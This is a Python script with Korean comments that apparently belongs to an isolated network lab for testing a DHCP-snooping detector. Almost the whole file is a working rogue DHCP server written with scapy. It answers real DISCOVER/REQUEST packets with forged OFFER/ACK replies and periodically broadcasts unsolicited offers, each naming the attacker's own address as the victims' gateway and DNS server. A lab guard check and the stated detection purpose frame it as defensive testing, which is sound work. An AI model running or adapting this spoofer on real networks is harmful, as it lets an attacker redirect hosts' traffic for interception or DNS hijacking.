"""가짜(rogue) DHCP 서버 (w11) — 격리 실험용.

공격자가 정상 DHCP 서버보다 먼저(또는 경쟁해서) DHCPOFFER를 보내, 피해자가
공격자를 기본 게이트웨이·DNS로 쓰도록 유도합니다. 이 스크립트는 OFFER/ACK만
보냅니다 — 실제로 트래픽을 가로채거나 전달하지 않습니다. 탐지기가 "같은
서브넷에 DHCP 서버가 둘"인 상황을 잡는지 보는 것이 목적입니다.

동작 두 가지를 병행합니다.
  1. 공격자 인터페이스로 들어오는 실제 DHCPDISCOVER/REQUEST를 스니핑해서
     즉시 OFFER/ACK로 응답(경쟁 상황을 그대로 재현).
  2. 이 실습망의 호스트는 정적 IP를 쓰므로 실제 DHCPDISCOVER가 거의
     발생하지 않습니다. 그래서 일정 주기로 "불특정" DHCPOFFER도 브로드캐스트로
     내보냅니다 — DHCP 스누핑 탐지기는 보통 "예상한 서버 MAC/IP가 아닌 곳에서
     OFFER가 온다"는 것만으로 가짜 서버를 잡으므로, 클라이언트 반응 없이도
     탐지 대상 신호가 됩니다.

gateway-ip, dns-ip로 공격자 자신의 주소를 줍니다.

run.py가 Mininet 공격자 호스트 안에서 실행합니다. 직접 실행은 labguard가 막습니다.

    python env/attacks/dhcp_rogue.py --iface h4-eth0 --server-ip 10.0.0.4 \
        --offer-ip 10.0.0.200 --duration 30
"""

from __future__ import annotations

import random
import threading
import time

from env.attacks.labguard import require_lab


def _unsolicited_offers(iface: str, server_ip: str, offer_ip: str,
                         gateway_ip: str, dns_ip: str, my_mac: str,
                         end: float, interval: float, counter: list) -> None:
    """실제 DISCOVER 없이도 주기적으로 OFFER를 브로드캐스트."""
    from scapy.all import BOOTP, DHCP, IP, UDP, Ether, sendp

    while time.time() < end:
        xid = random.randint(0, 0xFFFFFFFF)
        pkt = (
            Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src=server_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(op=2, yiaddr=offer_ip, siaddr=server_ip, xid=xid)
            / DHCP(options=[
                ("message-type", 2),  # OFFER
                ("server_id", server_ip),
                ("lease_time", 300),
                ("subnet_mask", "255.255.255.0"),
                ("router", gateway_ip),
                ("name_server", dns_ip),
                "end",
            ])
        )
        sendp(pkt, iface=iface, verbose=False)
        counter[0] += 1
        time.sleep(interval)


def run(iface: str, server_ip: str, offer_ip: str, gateway_ip: str,
        dns_ip: str, duration: float, offer_interval: float) -> None:
    from scapy.all import BOOTP, DHCP, IP, UDP, Ether, get_if_hwaddr, sendp, sniff

    my_mac = get_if_hwaddr(iface)
    replied = 0
    unsolicited = [0]
    end = time.time() + duration

    t = threading.Thread(
        target=_unsolicited_offers,
        args=(iface, server_ip, offer_ip, gateway_ip, dns_ip, my_mac, end,
              offer_interval, unsolicited),
        daemon=True,
    )
    t.start()

    def handle(pkt):
        nonlocal replied
        if time.time() > end:
            return
        if DHCP not in pkt:
            return
        mtype = next((v for k, v in pkt[DHCP].options if k == "message-type"), None)
        if mtype == 1:        # DISCOVER -> OFFER
            resp_type = "offer"
        elif mtype == 3:      # REQUEST -> ACK
            resp_type = "ack"
        else:
            return
        reply = (
            Ether(src=my_mac, dst=pkt[Ether].src)
            / IP(src=server_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(op=2, yiaddr=offer_ip, siaddr=server_ip,
                    chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid)
            / DHCP(options=[
                ("message-type", 2 if resp_type == "offer" else 5),
                ("server_id", server_ip),
                ("lease_time", 300),
                ("subnet_mask", "255.255.255.0"),
                ("router", gateway_ip),
                ("name_server", dns_ip),
                "end",
            ])
        )
        sendp(reply, iface=iface, verbose=False)
        replied += 1

    sniff(iface=iface, filter="udp and (port 67 or port 68)",
          prn=handle, timeout=duration)
    t.join(timeout=2)
    print(f"dhcp_rogue 끝: 응답 {replied}개, 불특정 OFFER {unsolicited[0]}개 "
          f"(iface={iface}, server_ip={server_ip})")


def main() -> None:
    require_lab()
    import argparse
    p = argparse.ArgumentParser(description="가짜 DHCP 서버 (격리 실험용)")
    p.add_argument("--iface", required=True)
    p.add_argument("--server-ip", required=True, help="공격자가 사칭할 서버 IP(보통 자기 IP)")
    p.add_argument("--offer-ip", required=True, help="피해자에게 줄 임대 IP")
    p.add_argument("--gateway-ip", default=None, help="피해자에게 줄 기본 게이트웨이(기본: server-ip)")
    p.add_argument("--dns-ip", default=None, help="피해자에게 줄 DNS(기본: server-ip)")
    p.add_argument("--duration", type=float, default=30.0)
    p.add_argument("--offer-interval", type=float, default=3.0,
                   help="실제 요청이 없을 때 불특정 OFFER를 보내는 주기(초)")
    a = p.parse_args()
    gw = a.gateway_ip or a.server_ip
    dns = a.dns_ip or a.server_ip
    run(a.iface, a.server_ip, a.offer_ip, gw, dns, a.duration, a.offer_interval)


if __name__ == "__main__":
    main()
